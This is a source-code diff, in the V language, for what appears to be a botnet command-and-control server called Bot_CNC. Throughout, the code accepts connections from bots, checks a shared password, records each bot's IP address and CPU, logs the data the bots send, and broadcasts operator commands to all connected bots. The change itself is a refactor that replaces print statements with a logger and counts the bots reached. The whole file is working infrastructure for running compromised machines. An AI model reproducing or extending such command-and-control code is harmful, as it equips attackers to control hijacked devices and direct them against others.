@@ -5,6 +5,8 @@ import net
 import time
 import rand
 
+import core.logger
+
 pub struct Bot_CNC {
 	pub mut:
 		nickname	[]string
@@ -24,6 +26,10 @@ pub fn start_bot(mut b Bot_CNC, port string, bot_pw string)  {
 	b.listener(port, bot_pw)
 }
 
+pub fn (mut b Bot_CNC) bot_count() int {
+	return b.nickname.len
+}
+
 pub fn (mut b Bot_CNC) add_bot_session(nick string, mut s net.TcpConn, cpu string, ip string, port string) {
 	b.nickname << nick
 	b.socket << s
@@ -35,7 +41,7 @@ pub fn (mut b Bot_CNC) add_bot_session(nick string, mut s net.TcpConn, cpu strin
 pub fn (mut b Bot_CNC) remove_bot(mut s net.TcpConn) {
 	for i, sock in b.socket {
 		if sock == s {
-			println("[ x ] Lost connection to: ${b.ip[i]}.....!")
+			logger.console_log("lost_conn", "Lost connection to: ${b.ip[i]}.....!", true)
 			b.nickname.delete(i)
 			b.socket.delete(i)
 			b.cpu.delete(i)
@@ -48,13 +54,13 @@ pub fn (mut b Bot_CNC) remove_bot(mut s net.TcpConn) {
 
 pub fn (mut b Bot_CNC) listener(port string, bot_pw string) {
 	mut socket := net.listen_tcp(.ip6, ":${port}") or {
-		println("[x] Error, Unable to start bot system.....!")
+		logger.console_log("bot_server_fail", "Unable to start bot system.....!", true)
 		return
 	}
 
 	for {
 		mut bot_conn := socket.accept() or {
-			println("[x] Error, Unable to accept bot connection....!")
+			logger.console_log("accept_user_fail", "Unable to accept bot connection....!", true)
 			return
 		}
 		bot_conn.set_read_timeout(time.infinite)
@@ -64,30 +70,30 @@ pub fn (mut b Bot_CNC) listener(port string, bot_pw string) {
 
 pub fn (mut b Bot_CNC) bot_auth(mut bot_conn net.TcpConn, bot_pw string) {
 	mut reader := io.new_buffered_reader(reader: bot_conn)
-	println("[ + ] Requesting bot for password...!")
+	logger.console_log("requesting_pw", "Requesting bot for password...!", true)
 	hid_pw := reader.read_line() or { "" }
 	
 	if hid_pw.replace("\n", "") != bot_pw {
 		bot_conn.write_string("[x]\n") or { 0 }
-		println("[x] Error, Bot access denied. Invalid password provided....!")
+		logger.console_log("invalid_bot_pw", "Bot access denied. Invalid password provided....!", true)
 		bot_conn.close() or { return }
 		return
 	}
 	bot_conn.write_string("[ + ] Authorized....!\n") or { 0 }
-	println("[ + ] Bot Password Authorized....!")
+	logger.console_log("requesting_pw", "Bot Password Authorized....!", false)
 
-	println("[ + ] Requesting CPU....!")
+	logger.console_log("requesting_cpu", "Requesting CPU....!", false)
 	cpu := reader.read_line() or { "" }
-	println("[ + ] Waiting for CPU from device....!")
+	logger.console_log("waiting_cpu", "Waiting for CPU from device....!", false)
 	if cpu == "" {
-		println("[ + ] Bot CPU: ${cpu}")
+		logger.console_log("invalid_bot_cpu", "Invalid cpu provided", true)
 		bot_conn.close() or { return }
 		return
 	}
 
 	user_addy := bot_conn.peer_addr() or { return }
 	user_ip := "${user_addy}".split("]:")[0].replace("[::ffff:", "")
-	println("Bot [${user_ip}][${cpu}] successfully connected.....!")
+	logger.console_log("bot_connected", "Bot [${user_ip}][${cpu}] successfully connected.....!", false)
 	b.add_bot_session(b.randomize_nick(), mut bot_conn, cpu, user_ip, "")
 	for {
 		data := reader.read_line() or {
@@ -96,7 +102,7 @@ pub fn (mut b Bot_CNC) bot_auth(mut bot_conn net.TcpConn, bot_pw string) {
 		}
 
 		if data.len > 3 {
-			println(data)
+			logger.console_log("new_bot_data", data, false)
 		}
 	}
 }
@@ -107,8 +113,8 @@ pub fn (mut b Bot_CNC) broadcast_cmd(cmd string) int {
 		b.socket[i].write_string("${cmd}\r\n") or { 0 }
 		c++
 	}
-	println("[ + ] Cmd sent to ${c} bots")
-	return 1
+	logger.console_log("bot_cmd_sent", "Cmd sent to ${c} bots", false)
+	return c
 }
 
 pub fn (mut b Bot_CNC) parse_buffer(buff string) (string, string, []string) {
